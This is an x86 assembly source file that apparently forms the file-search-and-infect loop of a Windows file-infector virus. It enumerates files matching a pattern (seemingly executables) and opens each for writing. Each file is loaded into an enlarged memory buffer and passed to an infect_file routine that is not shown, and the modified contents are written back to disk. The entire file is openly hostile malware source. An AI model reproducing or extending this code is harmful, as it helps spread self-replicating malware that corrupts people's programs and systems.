
ifndef SEARCH_FILES_ASM_
SEARCH_FILES_ASM_ MACRO
ENDM

; Declared in current procedure (main):
; LOCAL getProcAddress_addr:DWORD
; LOCAL loadLibrary_addr:DWORD
; LOCAL imageBase:DWORD
; LOCAL filehandle:DWORD
; LOCAL fileptr:DWORD
; LOCAL filesearchhandle:DWORD
; LOCAL filesize:DWORD
; LOCAL win32finddata:WIN32_FIND_DATA

; Function addresses
; LOCAL closehandle_addr:DWORD
; LOCAL createfile_addr:DWORD
; LOCAL findclose_addr:DWORD
; LOCAL findfirstfile_addr:DWORD
; LOCAL findnextfile_addr:DWORD
; LOCAL getfilesize_addr:DWORD
; LOCAL messagebox_addr:DWORD
; LOCAL readfile_addr:DWORD
; LOCAL setfilepointer_addr:DWORD
; LOCAL virtualalloc_addr:DWORD
; LOCAL virtualfree_addr:DWORD
; LOCAL writefile_addr:DWORD

    lea  ecx, win32finddata
    push ecx
    lea  ecx, [ebx + file_regex]
    push ecx
    call findfirstfile_addr    
    cmp  eax, INVALID_HANDLE_VALUE
    je   exit_search_exe
    mov  filesearchhandle, eax  

search_exe_loop:

    push 0                    
    push 80h                   
    push 3                     
    push 0                     
    push 0                     
    push 0c0000000h           
    lea  ecx, win32finddata.cFileName;
    push ecx                   
    call createfile_addr       
    mov  filehandle, eax
    cmp  filehandle, -1
    je   open_failed

    push 0
    push filehandle
    call getfilesize_addr      
    mov  filesize, eax
    cmp  eax, -1
    je   syserr

    add  eax, 5000h           

    push 04h                   
    push 00001000h            
    push eax                 
    push 0                     
    call virtualalloc_addr     
    mov  fileptr, eax
    cmp  eax, 0
    je   syserr

    push 0
    lea  ecx, dwRead
    push ecx
    push filesize
    push fileptr
    push filehandle
    call readfile_addr         
    cmp  eax, 0
    je   syserr


    invoke infect_file, fileptr, filesize, virtualalloc_addr, virtualfree_addr 
    mov  filesize, eax

    push 0                     
    push 0                     
    push 0                     
    push filehandle
    call setfilepointer_addr    
    cmp  eax, -1
    je   syserr

    push 0
    lea  ecx, dwRead
    push ecx

    push filesize
    push fileptr
    push filehandle
    call writefile_addr        

    push filehandle
    call closehandle_addr      

    push 08000h
    push 0
    push fileptr
    call virtualfree_addr



open_failed:
    lea  ecx, win32finddata
    push ecx
    push filesearchhandle
    call findnextfile_addr     
    cmp  eax, 0
    je   exit_search_exe       

syserr:

    jmp  search_exe_loop       

exit_search_exe:


endif                          
